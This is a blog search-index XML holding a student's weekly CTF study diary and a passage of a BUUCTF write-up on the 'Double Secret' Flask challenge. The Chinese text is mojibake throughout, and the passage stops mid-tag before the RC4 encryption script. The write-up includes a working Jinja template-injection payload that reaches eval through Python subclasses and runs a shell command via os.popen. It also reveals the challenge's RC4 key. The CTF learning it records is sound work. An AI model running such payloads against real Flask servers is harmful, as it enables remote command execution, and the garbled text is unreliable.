<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>å¯’å‡ç¬¬äºŒ&amp;ä¸‰å‘¨_å‘¨æ€»ç»“</title>
    <link href="/2024/02/19/2024-2-19-%E5%AF%92%E5%81%87%E7%AC%AC%E4%BA%8C&amp;%E4%B8%89%E5%91%A8_%E5%91%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/19/2024-2-19-%E5%AF%92%E5%81%87%E7%AC%AC%E4%BA%8C&amp;%E4%B8%89%E5%91%A8_%E5%91%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="å¯’å‡ç¬¬äºŒ-ä¸‰å‘¨-å‘¨æ€»ç»“-ã€Šæˆ‘çš„å¥‹æ–—southç‰ˆã€‹"><a href="#å¯’å‡ç¬¬äºŒ-ä¸‰å‘¨-å‘¨æ€»ç»“-ã€Šæˆ‘çš„å¥‹æ–—southç‰ˆã€‹" class="headerlink" title="å¯’å‡ç¬¬äºŒ&amp;ä¸‰å‘¨_å‘¨æ€»ç»“-ã€Šæˆ‘çš„å¥‹æ–—southç‰ˆã€‹"></a>å¯’å‡ç¬¬äºŒ&amp;ä¸‰å‘¨_å‘¨æ€»ç»“-ã€Šæˆ‘çš„å¥‹æ–—southç‰ˆã€‹</h1><h2 id="ç¬¬äºŒ-ä¸‰å‘¨"><a href="#ç¬¬äºŒ-ä¸‰å‘¨" class="headerlink" title="ç¬¬äºŒ&amp;ä¸‰å‘¨:"></a>ç¬¬äºŒ&amp;ä¸‰å‘¨:</h2><h3 id="Todoï¼š"><a href="#Todoï¼š" class="headerlink" title="Todoï¼š"></a>Todoï¼š</h3><h3 id="south"><a href="#south" class="headerlink" title="south:"></a>south:</h3><p>1.BUUCTFç¬¬ä¸‰é¢é¢˜ç›®å…¨éƒ¨åˆ·å®Œ(9é“é¢˜ï¼Œå‘¨ä¸€ï¼Œå‘¨äºŒï¼Œå‘¨ä¸‰)ï¼ˆå®Œæˆ13é¢˜ï¼‰</p><p>åæ€:è¿™ä¸¤å‘¨éƒ½æ˜¯è¿‡å¹´çš„äº‹æƒ…ï¼Œæœ¬æ¥ä»¥ä¸ºè‡ªå·±è¿‡å¹´ä¼šå¥½å¥½å­¦ä¹ ï¼Œè¿˜æ˜¯é«˜çœ‹è‡ªå·±äº†â—•â€¿â—•ï¼ŒçœŸçš„æœ‰äººè¿‡å¹´çš„æ—¶å€™ä¼šå¥½å¥½å­¦ä¹ å—ï¼Œè‡³å°‘æˆ‘ä¸ä¼š(Ëš ËƒÌ£Ì£Ì¥á·„âŒ“Ë‚Ì£Ì£Ì¥á·… )ï¼Œæœ€ååšåˆ°åŸºæœ¬ä¸Šä¸€å¤©ä¸€é¢˜é‡å·²ç»æ˜¯æˆ‘çš„æé™äº†ï¼ç¬¬ä¸‰é¢æ€»ç®—æ˜¯å‘Šä¸€æ®µæ®µè½(à¹‘áµ’Ì´Ì¶Ì·Íˆá·„á—¨áµ’Ì´Ì¶Ì·Íˆá·…)ï¼Œå¼€å¯ç¬¬å››é¢çš„æ–°ä¸–ç•Œï¼Œæ„Ÿè§‰éš¾åº¦åˆä¸æ˜¯ä¸€ä¸ªæ¡£æ¬¡ï¼Œä¸€é¢˜æ„Ÿè§‰å°±è¦ç£¨å¥½å‡ ä¸ªå°æ—¶ï¼Œå¥½å¤šæ–°ä¸œè¥¿ï¼ï¼ï¼ä¸è¿‡æ€»ç®—æ˜¯å¼€å§‹æ¥è§¦çœŸæ­£æ„ä¹‰ä¸Šæœ‰æ„æ€çš„æ¼æ´äº†à«®(Ë¶áµ” áµ• áµ”Ë¶)áƒï¼Œå†²å°±å®Œäº†ï¼</p><p>2.[ç¬¬äºŒå±ŠN1CTF Junior]zakoå¤ç°ï¼ˆå‘¨å››ï¼‰(å®Œæˆ)</p><p>åæ€ï¼šè¿™é“é¢˜å¤ç°çš„è¶…çº§å¼€å¿ƒã€ƒâ€¢Ï‰â€¹ã€ƒï¼Œå› ä¸ºç¯å¢ƒè‡ªå·±æ­å‡ºæ¥äº†ï¼Œç»ˆäºæœ‰ä¸€é“é¢˜å¯ä»¥ç”¨ç¯å¢ƒå¤ç°äº†ï¼Œè€Œä¸”å¤ç°çš„æ—¶å€™ä¹Ÿä¸å¡ï¼ŒåŸºæœ¬éƒ½å¯ä»¥é©¬ä¸Šå­¦ä¼šï¼Œè€Œä¸”å­¦äº†æ–°çš„æ–‡ä»¶å†™å…¥å’Œè¯»å–bypass,âœ§<em>ï½¡ (ËŠá—œË‹</em>) âœ§*ï½¡ç‰›çš®ï¼åªå¸Œæœ›æˆ‘ä¹‹åæ¯”èµ›éƒ½èƒ½å¤Ÿè®°ä½à«®â‚ Ëƒ â¤™ Ë‚ â‚áƒ(è€å¹´äººçš„è®°å¿†emmm)ã€‚</p><p>3.å¥èº«4æ¬¡ï¼ˆ4æ¬¡ï¼‰</p><p>åæ€ï¼šåªæœ‰ç¬¬äºŒå‘¨å¥èº«äº†ï¼Œå› ä¸ºå¥èº«æˆ¿ä¹Ÿæ”¾å‡äº†ï¼Œç¬¬ä¸‰å‘¨åŸºæœ¬å¼€æ‘†ä¸æƒ³åŠ¨ï¼Œä¸‹å‘¨å¾—åŠ ä¸€ä¸‹å¼ºåº¦ï¼Œä¸èƒ½æ‘†äº†áœŠ(ê’ªËŠê’³Ë‹ê’ª)áœŠã€‚</p><p>5.VNCTFåšå‡ºä¸€é“webé¢˜</p><p>åæ€ï¼šå“¦ä¸ï¼Œç®€ç›´æ˜¯è€»è¾±å•Šï¼Œå­¦äº†è¿™ä¹ˆä¹…æ‰åšå‡ºä¸€é“ï¼Œå¯æ¶ï¼ï¼ï¼å—ä¸äº†çº¢æ¸©äº†(ã£â—â€¸â—Ÿc)ï¼Œä½†å…¶å®ä»”ç»†æƒ³æƒ³ç¡®å®æ˜¯è‡ªå·±çš„çŸ¥è¯†å‚¨å¤‡ä¸å¤Ÿï¼Œä»¥åŠæŸ¥æ‰¾èƒ½åŠ›çš„ä¸å¤Ÿç†Ÿç»ƒï¼Œå…¶å®æœ‰ä¸€é¢˜æˆ‘å·²ç»æ‰¾åˆ°ç›¸å…³æ–‡ç« äº†ï¼Œä½†æ˜¯çœ‹äº†è¿™ä¹ˆä¹…å°±æ˜¯å¿½ç•¥äº†ä¸€ä¸ªåœ°æ–¹ï¼Œå¯¼è‡´æ€ä¹ˆéƒ½åšä¸å‡ºæ¥ï¼Œä¸‹æ¬¡æ•°æ®åŒ…è¿˜æ˜¯å¾—çœ‹ä»”ç»†ç‚¹ï¼Œè¿˜æœ‰é¢˜ç›®çš„æ‰€æœ‰çš„ä¸šåŠ¡é€»è¾‘ç‚¹éƒ½è¦å»çœ‹ä¸€éï¼Œå› ä¸ºä¸‡ä¸€è¿™ä¸ªç‚¹å°±æœ‰hintå‘¢áƒ´Ë˜à´°â€¸à´°áƒ´ï¼ï¼ï¼å†æ¥å†åŠ±å§ï¼Œsouth!</p><h2 id="å­¦ä¹ "><a href="#å­¦ä¹ " class="headerlink" title="å­¦ä¹ :"></a>å­¦ä¹ :</h2><h3 id="ç¬¬äºŒå‘¨-ç¬¬ä¸‰å‘¨ï¼ˆ2-5-2-18ï¼‰ï¼š"><a href="#ç¬¬äºŒå‘¨-ç¬¬ä¸‰å‘¨ï¼ˆ2-5-2-18ï¼‰ï¼š" class="headerlink" title="ç¬¬äºŒå‘¨&amp;ç¬¬ä¸‰å‘¨ï¼ˆ2.5-2.18ï¼‰ï¼š"></a>ç¬¬äºŒå‘¨&amp;ç¬¬ä¸‰å‘¨ï¼ˆ2.5-2.18ï¼‰ï¼š</h3><ul><li><p><input checked disabled type="checkbox"> </p><h5 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="ç¬¬äºŒå±ŠN1CTF-Junior-zakoå¤ç°"><a href="#ç¬¬äºŒå±ŠN1CTF-Junior-zakoå¤ç°" class="headerlink" title="[ç¬¬äºŒå±ŠN1CTF Junior]zakoå¤ç°"></a>[ç¬¬äºŒå±ŠN1CTF Junior]zakoå¤ç°</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite"><a href="#ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite" class="headerlink" title="[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite"></a>[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</h5></li></ul><h2 id="ç”Ÿæ´»"><a href="#ç”Ÿæ´»" class="headerlink" title="ç”Ÿæ´»:"></a>ç”Ÿæ´»:</h2><p>1.ã€Šæ€ç»´æ”¹å˜ç”Ÿæ´»ã€‹çœ‹äº†ä¸€ç« </p><p>åæ€ï¼šçœ‹åˆ°ç¬¬å››ç« çš„æ—¶å€™æˆ‘æ„Ÿè§‰æœ‰ç‚¹ä¸å¯¹åŠ²äº†ï¼Œå› ä¸ºä¹¦æœ¬ä¸­çš„æ€ç»´æ–¹å¼ä¸æˆ‘çš„æ€ç»´æ–¹å¼æœ‰å¤ªå¤§çš„å†²å‡»äº†ï¼Œæˆ‘è¶Šçœ‹è¶Šä¸è®¤å¯ï¼Œåæ­£åˆ°ç°åœ¨æˆ‘ä¹Ÿä¸è®¤å¯å®ƒçš„è§‚å¿µ(ê’ªâŒ“ê’ª)ï¼Œåˆæˆ–æ˜¯è‡ªå·±ç»å†çš„äº‹æƒ…å¤ªæµ…äº†ï¼Œè¿˜çœ‹ä¸æ˜ç™½?åæ­£åˆ°ç°åœ¨è¿˜å¤„äºæŠµè§¦çŠ¶æ€ï¼Œæ‰€ä»¥å†è€ƒè™‘æ¢ä¸€æœ¬ä¹¦ï¼Œä¸è¿‡æš‚æ—¶åº”è¯¥ä¸ç”¨ï¼Œä¸çŸ¥é“ä¸ºå•¥æœ€è¿‘å¿ƒæ€æœ‰ç§å‰æ‰€æœªæœ‰çš„å¹³é™æ„Ÿã¥â™¡ã©ï¼Œæ‰€ä»¥åº”è¯¥æš‚æ—¶ä¸ç”¨äº†å§ï¼Œä¹Ÿè®¸,,,,,</p><p>2.è¿‡å¹´</p><p>æ€»ç»“ï¼šè¿‡å¹´çš„æ„Ÿè§‰å§ï¼Œå°±æ˜¯ç¡¬å¹³èººäº«å—å°±å¯¹äº†á••( á› )á•—ã€‚</p><h2 id="å·¥ä½œï¼š"><a href="#å·¥ä½œï¼š" class="headerlink" title="å·¥ä½œï¼š"></a>å·¥ä½œï¼š</h2><p>1.å¼€äº†webéƒ¨é—¨çš„å‘¨ä¼š</p><p>åæ€ï¼šå‘¨ä¼šå’Œå¤§å®¶èŠäº†å¾ˆå¤šï¼Œå¾ˆå¼€å¿ƒï¼Œä¸€èµ·å­¦ä¹ å…±è¿›æ„Ÿè§‰çœŸå¥½ï¼Œè€Œä¸”è®¨è®ºé—®é¢˜çœŸçš„å¥½æœ‰è¶£ï¼Œå¯ä»¥äº†è§£å¤§å®¶å¾ˆå¤šæƒ³æ³•ï¼Œç›¸äº’æå»ºè®®ï¼Œå¤ªé…·å•¦(âœ§âˆ‡âœ§)ï¼è¿™å‘¨å¾ˆç®€å•ï¼Œå› ä¸ºè¿‡å¹´ï¼Œæ‰€ä»¥ä¹Ÿæ²¡å•¥å¥½æ€»ç»“çš„ï¼Œä¸è¿‡ä¸‹å‘¨å°±è¦å›åˆ°æ­£è½¨äº†ï¼Œå†²å†²å†²(á•‘á—¢á“«âˆ—)Ë’ï¼</p><h2 id="å¨±ä¹"><a href="#å¨±ä¹" class="headerlink" title="å¨±ä¹:"></a>å¨±ä¹:</h2><p>1.çœ‹äº†ã€Šçƒ­è¾£æ»šçƒ«ã€‹ã€Šç†Šå‡ºæ²¡ã€‹</p><p>æ€»ç»“ï¼šã€Šçƒ­è¾£æ»šçƒ«ã€‹æˆ‘ä¸ªäººè®¤ä¸ºè¿˜æ˜¯å¾ˆå¥½çœ‹çš„ï¼Œè‡³å°‘æˆ‘å¾ˆå¿«ä¹çœ‹çš„æ—¶å€™ï¼Œçœ‹åˆ°è´¾ç²ä¸€å¹´å‡äº†100æ–¤ï¼Œç¡®å®éœ‡æƒŠåˆ°äº†ï¼Œå¤§æ³¢æµªçš„è´¾ç²ï¼Œä½ åˆ«è¯´ï¼Œè¿˜çœŸæŒºå¥½çœ‹çš„(âœ§âˆ‡âœ§)ï¼Œä¸è¿‡è¿™éƒ¨å½±ç‰‡å¥½åƒæ˜¯ç¿»æ‹æ—¥æœ¬çš„ã€Šç™¾å…ƒä¹‹æ‹ã€‹ï¼Œç„¶åæœ€è¿‘é£è¯„å¥½åƒå‡ºç°ä¸¤æåˆ†åŒ–äº†ï¼Œä¸è¿‡æˆ‘æ— æ‰€è°“ï¼Œå› ä¸ºæˆ‘çœ‹çš„çˆ½å°±å®Œäº†(*ï¼â—¡â›)ã€‚ã€Šç†Šå‡ºæ²¡ã€‹çœŸçš„æ˜¯å¤ªå¥½çœ‹äº†ï¼Œå¤ªå¥½çœ‹äº†ï¼Œå¤ªå¥½çœ‹äº†ï¼Œé‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼ŒçœŸçš„å¼ºçƒˆæ¨èï¼Œä»æ¥æ²¡æœ‰ä¸€éƒ¨ç”µå½±èƒ½æœ‰è¿™ä¹ˆè®©æˆ‘å…±æƒ…ï¼Œè€Œä¸”åŠ¨ç”»çš„åœºé¢ä¹Ÿå¾ˆå®ä¼Ÿï¼Œå¾ˆåƒå¤è”å››æœ€åæ‰“ç­éœ¸çš„åœºæ™¯ï¼Œåæ­£å°±æ˜¯è¯´çœ‹çš„éå¸¸çˆ½ï¼æ–‡æˆæˆ‘ä¸ªäººè®¤ä¸ºéå¸¸ä¸é”™ã€‚æœ€åå†å¼ºè°ƒä¸€ä¸‹ï¼Œå¤ªå¥½çœ‹äº†ï¼Œä¸æ„§æ˜¯æ˜¥èŠ‚æ¡£æœ€å¼ºé¡¶æµï¼Œä»¥åæ˜¥èŠ‚æˆ‘çš„å›ºå®šçš„ä»»åŠ¡äº†ï¼ï¼ï¼âœ§*ï½¡ (ËŠá—œË‹*) âœ§*ï½¡</p><p>2.ä¹°äº†æ°´æ²‰é¦™</p><p>æ€»ç»“ï¼šå¤ªå¥½é—»äº†ï¼Œæ®è¯´æœ‰ç›Šäºå‘¼å¸é“å’Œå¿ƒè¡€ç®¡å¥åº·ï¼ŒçŸ­è§†é¢‘åˆ·åˆ°çš„ï¼Œåæ­£æˆ‘éƒ½åœ¨å–èŒ¶å…»è€äº†ï¼Œå†å¤šä¸€ä¸ª(âœ§âˆ‡âœ§)ï¼Œå­¦ä¹ çš„æ—¶å€™ç‚¹ä¸€æ ¹çœŸçš„é™å¿ƒï¼ï¼ï¼</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a>æ€»ç»“:</h2><p>è·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢ã€‚</p><h2 id="ç¬¬å››å‘¨"><a href="#ç¬¬å››å‘¨" class="headerlink" title="ç¬¬å››å‘¨:"></a>ç¬¬å››å‘¨:</h2><h3 id="Todo"><a href="#Todo" class="headerlink" title="Todo:"></a>Todo:</h3><p>1.vnctfé¢˜ç›®å¤ç°ï¼ˆ3å¤©ï¼‰</p><p>2.buuctfç»§ç»­ï¼Œå°½é‡6é¢˜å¾€ä¸Š</p><p>3.å‡†å¤‡é¢è¯•</p><p>4.å¥èº«ä¸‰æ¬¡</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</title>
    <link href="/2024/02/19/2024-02-19-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/"/>
    <url>/2024/02/19/2024-02-19-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p>[<a href="https://www.cnblogs.com/h3zh1/p/12653579.html">CISCN2019 åä¸œå—èµ›åŒº]Double Secret - ä½•æ­¢(h3zh1) - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><p><img src="/images/2024-2-18/image-20240214100310464.png" alt="image-20240214100310464"></p><p>æˆ‘ä»¬å°è¯•ç”¨dirsearchæ‰«ä¸€ä¸‹ç½‘ç«™çš„åå°æ‰¾ä¸€ä¸‹ï¼Œå…¶å®å¯ä»¥çŒœæµ‹BPæŠ“åŒ…ä¸­çš„cookieï¼Œæˆ–è€…ç½‘é¡µurl&#x2F;secret</p><p>ä½¿ç”¨dirsearchæ‰«ä¸€ä¸‹ç½‘ç«™çš„åå°æ–‡ä»¶ï¼š</p><p><img src="/images/2024-2-18/image-20240214100825023.png" alt="image-20240214100825023"></p><h3 id="è®¿é—®-robots-txt"><a href="#è®¿é—®-robots-txt" class="headerlink" title="è®¿é—®:robots.txt:"></a>è®¿é—®:robots.txt:</h3><p><img src="/images/2024-2-18/image-20240214214745096.png" alt="image-20240214214745096"></p><p>æ²¡æœ‰è·å¾—æœ‰ç”¨ä¿¡æ¯ã€‚</p><h3 id="è®¿é—®console"><a href="#è®¿é—®console" class="headerlink" title="è®¿é—®console:"></a>è®¿é—®console:</h3><p><img src="/images/2024-2-18/image-20240214214843671.png" alt="image-20240214214843671"></p><p>å­˜åœ¨æ§åˆ¶å°ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“pinç æ‰€ä»¥æ— æ³•ä½¿ç”¨ã€‚</p><h2 id="è®¿é—®url-secret"><a href="#è®¿é—®url-secret" class="headerlink" title="è®¿é—®url&#x2F;secret:"></a>è®¿é—®url&#x2F;secret:</h2><p>å› ä¸ºè®©æˆ‘ä»¬å¯»æ‰¾secret,ç°åœ¨å…¶ä»–é€”å¾„éƒ½å°è¯•è¿‡äº†ï¼Œæ‰€ä»¥åªèƒ½å…ˆè®¿é—®ä»¥ä¸‹url&#x2F;secretè¯•è¯•</p><p><img src="/images/2024-2-18/image-20240214215135531.png" alt="image-20240214215135531"></p><p>å›æ˜¾äº†ä¸åŒçš„å†…å®¹ï¼Œæ ¹æ®å›æ˜¾å†…å®¹ï¼Œå®ƒè®©æˆ‘ä»¬ä¼ è¾“secretçš„å€¼ï¼Œå°è¯•åœ¨è¿™ä¸ªç•Œé¢ç”¨GETæˆ–POSTè¯·æ±‚è¾“å…¥secretçš„å€¼</p><h2 id="ä¼ è¾“secretçš„å€¼"><a href="#ä¼ è¾“secretçš„å€¼" class="headerlink" title="ä¼ è¾“secretçš„å€¼:"></a>ä¼ è¾“secretçš„å€¼:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secret?secret=1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214215317954.png" alt="image-20240214215317954"></p><p>å›æ˜¾då†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿è¾“å…¥ä¸€äº›å†…å®¹è¯•è¯•,é€šè¿‡æ§åˆ¶å°æˆ‘ä»¬çŸ¥é“è¯¥ç½‘é¡µæ˜¯app.pyæ§åˆ¶çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬éšä¾¿è¾“å…¥çš„å†…å®¹å¯èƒ½ä¼šå¼•èµ·æŠ¥é”™ï¼Œæ‰€ä»¥è¶Šéšä¾¿è¶Šå¥½ã€‚</p><h3 id="éšä¾¿ä¼ ä¸€ä¸ªsecretå€¼"><a href="#éšä¾¿ä¼ ä¸€ä¸ªsecretå€¼" class="headerlink" title="éšä¾¿ä¼ ä¸€ä¸ªsecretå€¼:"></a>éšä¾¿ä¼ ä¸€ä¸ªsecretå€¼:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secret?secret=dadasdsadsadsa<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214215536521.png" alt="image-20240214215536521"></p><p>å‘ç”ŸæŠ¥é”™ï¼Œå¹¶å­˜åœ¨æºç æ³„éœ²ã€‚</p><h2 id="å¯»æ‰¾å’Œflagæˆ–è€…secretç›¸å…³çš„æºç å†…å®¹"><a href="#å¯»æ‰¾å’Œflagæˆ–è€…secretç›¸å…³çš„æºç å†…å®¹" class="headerlink" title="å¯»æ‰¾å’Œflagæˆ–è€…secretç›¸å…³çš„æºç å†…å®¹:"></a>å¯»æ‰¾å’Œflagæˆ–è€…secretç›¸å…³çš„æºç å†…å®¹:</h2><p><img src="/images/2024-2-18/image-20240214215638220.png" alt="image-20240214215638220"></p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç :"></a>æºç :</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py">   <span class="hljs-keyword">if</span>(secret==<span class="hljs-literal">None</span>):<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><br>   rc=rc4_Modified.RC4(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>)   <span class="hljs-comment">#è§£å¯†</span><br><br>   deS=rc.do_crypt(secret)<br><br><br><br>[Open an interactive python shell <span class="hljs-keyword">in</span> this frame]     a=render_template_string(safe(deS))<br><br><br><br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ciscn&#x27;</span> <span class="hljs-keyword">in</span> a.lower():<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;flag detected!&#x27;</span><br><br>   <span class="hljs-keyword">return</span> a<br></code></pre></td></tr></table></figure><p>app.pyå°†å†…å®¹å›æ˜¾åˆ°ç½‘é¡µä¸­é‡‡ç”¨render_template_string,æ‰€ä»¥å°è¯•æ‰¾ä¸€ä¸‹è¯¥å‡½æ•°æ‰€åœ¨ä»£ç </p><h2 id="å¯»æ‰¾render-template-stringæºç "><a href="#å¯»æ‰¾render-template-stringæºç " class="headerlink" title="å¯»æ‰¾render_template_stringæºç :"></a>å¯»æ‰¾render_template_stringæºç :</h2><p><img src="/images/2024-2-18/image-20240214220707751.png" alt="image-20240214220707751"></p><h3 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç :"></a>æºç :</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">:param context: the variables that should be available <span class="hljs-keyword">in</span> the<br><br>                   context of the template.<br><br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   ctx = _app_ctx_stack.top</span><br><span class="hljs-string"></span><br><span class="hljs-string">   ctx.app.update_template_context(context)</span><br><span class="hljs-string"></span><br><span class="hljs-string">   return _render(ctx.app.jinja_env.from_string(source),</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Open an interactive python shell in this frame]                    context, ctx.app)</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.æ ¹æ®æºç å®¡è®¡ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹secreté€šè¿‡rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)ä»¥åŠdeS=rc.do_crypt(secret)è¿›è¡Œrc4è§£å¯†å,å¯†é’¥æ˜¯HereIsTreasure,åœ¨ç»è¿‡safe()å‡½æ•°çš„æ£€æŸ¥ï¼Œç„¶åé€šè¿‡render_template_string(safe(deS))è¾“å‡ºåˆ°ç½‘é¡µä¸Šï¼Œè€Œç½‘é¡µçš„render_template_string(safe(deS))å‡½æ•°é‡‡ç”¨çš„æ˜¯jinjaæ¨¡æ¿ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œjinjaæ¨¡æ¿æ³¨å…¥ã€‚<br>2.è¿™é‡Œçš„safe()å‡½æ•°æ²¡æœ‰æºç æ³„éœ²ï¼Œæ‰€ä»¥åªèƒ½å…ˆå°è¯•ä½¿ç”¨æˆ‘ä»¬ç°åœ¨çš„æ¨¡æ¿æ³¨å…¥payloadã€‚<br></code></pre></td></tr></table></figure><h2 id="jinjaæ¨¡æ¿æ³¨å…¥payload"><a href="#jinjaæ¨¡æ¿æ³¨å…¥payload" class="headerlink" title="jinjaæ¨¡æ¿æ³¨å…¥payload:"></a>jinjaæ¨¡æ¿æ³¨å…¥payload:</h2><h3 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºapp.pyå¯¹æˆ‘ä»¬çš„è¾“å…¥çš„secretå†…å®¹è¿›è¡Œè§£å¯†å†è¾“å‡ºåˆ°ç½‘é¡µä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå¯¹æˆ‘ä»¬çš„ç½‘é¡µè¿›è¡Œrc4åŠ å¯†</p><h2 id="rc4åŠ å¯†è„šæœ¬"><a href="#rc4åŠ å¯†è„šæœ¬" class="headerlink" 